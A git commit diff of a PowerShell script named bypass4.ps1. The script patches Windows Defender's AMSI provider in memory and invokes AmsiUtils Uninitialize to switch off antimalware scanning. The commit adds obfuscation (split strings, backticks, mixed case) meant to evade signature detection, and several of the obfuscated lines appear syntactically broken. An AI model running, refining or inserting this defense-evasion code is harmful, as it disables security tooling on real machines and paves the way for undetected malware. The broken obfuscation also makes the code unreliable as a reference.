7c5343c987f9755f11f68756a21571fd945318f6
Sudo_Zeus <SudoZeus@protonmail.ch>
2024-04-18 16:55:45 -0700

    Add files via upload

--- bypass4.ps1
+++ bypass4.ps1
@@ -1,28 +1,32 @@
-﻿$APIs = @"
+﻿$Zeus = @"
 using System;
 using System.Runtime.InteropServices;
 public class APIs {
-    [DllImport("kernel32")]
+    ['D'+llImport("kernel32")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
+    ['D'+llImport("kernel32")]
     public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
+    ['D'+llImport("kernel32")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
 A+'dd'-T+'y'+'p'+'e' $Zeus
-$zzz1 = "0xB8"
+$z1 = "0"
+$z2 = "x"
+$z3 = "B"
+$z4 = "8"
+$zzz1 = $z1+$z1+$z3+$z4
 $zzz2 = "0x57"
 $zzz3 = "0x00"
 $zzz4 = "0x07"
 $zzz5 = "0x80"
 $zzz6 = "0xC3"
-$Patch = [Byte[]] ($zzz1,$zzz2,$zzz3,$zzz4,+$zzz5,+$zzz6)
-$LoadLibrary = [Zeus]::LoadLibrary("MpOav.dll")
-$Address = [Zeus]::GetProcAddress($LoadLibrary,"DllGetClassObject")
-$p = 0
-[Zeus]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
-[System.Runtime.InteropServices.Marshal]::'C'+'o'+'p'+'y'($Patch, 0, $Address, 6)
-$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
-$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
-$Uninitialize.Invoke($object,$null)
+$PiZaCh = [Byte[]] ($zzz1,$zzz2,$zzz3,$zzz4,+$zzz5,+$zzz6)
+$LLz7 = [Zeus]::LoadLibrary("MpOav.dll")
+$addy = [Zeus]::GetProcAddress($LLz7,"DllGetClassObject")
+$sz = 0
+[Zeus]::VirtualProtect($addy, [uint32]6, 0x40, [ref]$sz)
+[s`ys`TEM.rUnti`ME.iNtE`rOPsE`RvIcEs.M`aRS`Hal]::CoPy($PiZaCh, 0, $addy, 6)
+$tec = [Ref].aSSembly.gettYPE('Sys'+'tem.Ma'+'nag'+'eme'+'nt.'+'Autom'+'ati'+'on.A'+'m'+'s'+'i'+'U'+'t'+'i'+'l'+'s')
+$ezi = $tec.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
+$ezi.Invoke($tec,$null)
